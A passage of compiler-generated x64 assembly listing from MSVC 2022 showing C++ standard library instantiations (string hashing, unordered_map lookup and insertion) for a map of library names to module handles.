?deallocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAXQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z PROC ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::deallocate, COMDAT

; 947  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

	mov	rcx, rdx

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	edx, 56					; 00000038H
	jmp	??3@YAXPEAX_K@Z				; operator delete
?deallocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAXQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ENDP ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Do_hash@?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@SA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z
_TEXT	SEGMENT
_Keyval$ = 8
?_Do_hash@?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@SA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z PROC ; std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >::_Do_hash, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 5175 :     _NODISCARD static size_t _Do_hash(const basic_string<_Elem, char_traits<_Elem>, _Alloc>& _Keyval) noexcept {

	mov	r8, rcx

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r9, QWORD PTR [rcx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN8@Do_hash

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r8, QWORD PTR [rcx]
$LN8@Do_hash:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	edx, edx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rax, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r9, r9
	je	SHORT $LN29@Do_hash
	mov	r10, 1099511628211			; 00000100000001b3H
	npad	4
$LL25@Do_hash:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	ecx, BYTE PTR [r8+rdx]
	inc	rdx
	xor	rax, rcx

; 2302 :         _Val *= _FNV_prime;

	imul	rax, r10
	cmp	rdx, r9
	jb	SHORT $LL25@Do_hash
$LN29@Do_hash:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5177 :     }

	ret	0
?_Do_hash@?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@SA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ENDP ; std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >::_Do_hash
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size, COMDAT

; 4167 :         return _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR [rcx+16]

; 4168 :     }

	ret	0
?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::size
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V01@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z
_TEXT	SEGMENT
this$dead$ = 48
_Keyval1$ = 56
_Keyval2$ = 64
??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V01@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z PROC ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::operator()<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::basic_string<char,std::char_traits<char>,std::allocator<char> > >, COMDAT

; 150  :         noexcept(_Nothrow_compare<_Keyeq, _Keyty1, _Keyty2>) {

$LN37:
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [r8+24], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 150  :         noexcept(_Nothrow_compare<_Keyeq, _Keyty1, _Keyty2>) {

	mov	r9, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rcx, QWORD PTR [r8+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 150  :         noexcept(_Nothrow_compare<_Keyeq, _Keyty1, _Keyty2>) {

	mov	rax, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN14@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r9, QWORD PTR [r8]
$LN14@operator:

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	r8, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN21@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rdx]
$LN21@operator:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	r8, rcx
	jne	SHORT $LN29@operator

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	rdx, r9
	mov	rcx, rax
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	jne	SHORT $LN29@operator
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 153  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN29@operator:

; 151  :         // test if _Keyval1 NOT equal to _Keyval2
; 152  :         return !static_cast<bool>(_Mypair._Myval2._Get_first()(_Keyval1, _Keyval2));

	mov	al, 1

; 153  :     }

	add	rsp, 40					; 00000028H
	ret	0
??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V01@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z ENDP ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::operator()<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0M@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAM@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
<_Val2_0>$ = 24
??$?0M@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAM@Z PROC ; std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1><float>, COMDAT

; 1496 :         : _Ty1(), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	mov	eax, DWORD PTR [r8]
	mov	DWORD PTR [rcx], eax
	mov	rax, rcx
	ret	0
??$?0M@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEAA@U_Zero_then_variadic_args_t@1@$$QEAM@Z ENDP ; std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1><float>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z PROC ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> ><std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >, COMDAT

; 943  :     constexpr allocator(const allocator<_Other>&) noexcept {}

	mov	rax, rcx
	ret	0
??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ENDP ; std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> ><std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$to_address@PEBD@std@@YAPEAPEBDQEAPEBD@Z
_TEXT	SEGMENT
_Val$ = 8
??$to_address@PEBD@std@@YAPEAPEBDQEAPEBD@Z PROC		; std::to_address<char const *>, COMDAT

; 453  :     static_assert(!is_function_v<_Ty>, "N4950 [pointer.conversion]/1: Mandates: T is not a function type.");
; 454  :     return _Val;

	mov	rax, rcx

; 455  : }

	ret	0
??$to_address@PEBD@std@@YAPEAPEBDQEAPEBD@Z ENDP		; std::to_address<char const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$_Find@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEBAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z
_TEXT	SEGMENT
$T1 = 32
this$dead$ = 64
_Keyval$ = 72
_Hashval$ = 80
??$_Find@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEBAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >, COMDAT

; 1208 :     _Nodeptr _Find(const _Keyty& _Keyval, const size_t _Hashval) const {

$LN5:
	sub	rsp, 56					; 00000038H

; 1209 :         if constexpr (_Traits::_Multi) {
; 1210 :             return _Find_first(_Keyval, _Hashval);
; 1211 :         } else {
; 1212 :             // use _Find_last for unique containers to avoid increase in code size of instantiating _Find_first
; 1213 :             auto _Target = _Find_last(_Keyval, _Hashval)._Duplicate;

	mov	r9, r8
	mov	r8, rdx
	lea	rdx, QWORD PTR $T1[rsp]
	call	??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find_last<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
	mov	rcx, QWORD PTR [rax+8]

; 1214 :             if (_Target) {

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	test	rcx, rcx
	cmovne	rax, rcx

; 1215 :                 return _Target;
; 1216 :             }
; 1217 : 
; 1218 :             return _List._Mypair._Myval2._Myhead;
; 1219 :         }
; 1220 :     }

	add	rsp, 56					; 00000038H
	ret	0
??$_Find@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEBAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Find<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@PEBD@std@@YA$$QEAPEBDAEAPEBD@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@PEBD@std@@YA$$QEAPEBDAEAPEBD@Z PROC		; std::forward<char const *>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@PEBD@std@@YA$$QEAPEBDAEAPEBD@Z ENDP		; std::forward<char const *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEAPEAUHINSTANCE__@@@std@@YAAEAPEAUHINSTANCE__@@AEAPEAU1@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEAPEAUHINSTANCE__@@@std@@YAAEAPEAUHINSTANCE__@@AEAPEAU1@@Z PROC ; std::forward<HINSTANCE__ * &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEAPEAUHINSTANCE__@@@std@@YAAEAPEAUHINSTANCE__@@AEAPEAU1@@Z ENDP ; std::forward<HINSTANCE__ * &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@std@@YA$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@AEAU10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@std@@YA$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@AEAU10@@Z PROC ; std::forward<std::pair<char const *,HINSTANCE__ *> >, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@std@@YA$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@AEAU10@@Z ENDP ; std::forward<std::pair<char const *,HINSTANCE__ *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
_TEXT	SEGMENT
$T1 = 32
_Target$2 = 32
_Newnode$3 = 48
this$dead$ = 128
__$ReturnUdt$ = 136
<_Vals_0>$ = 144
??$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > 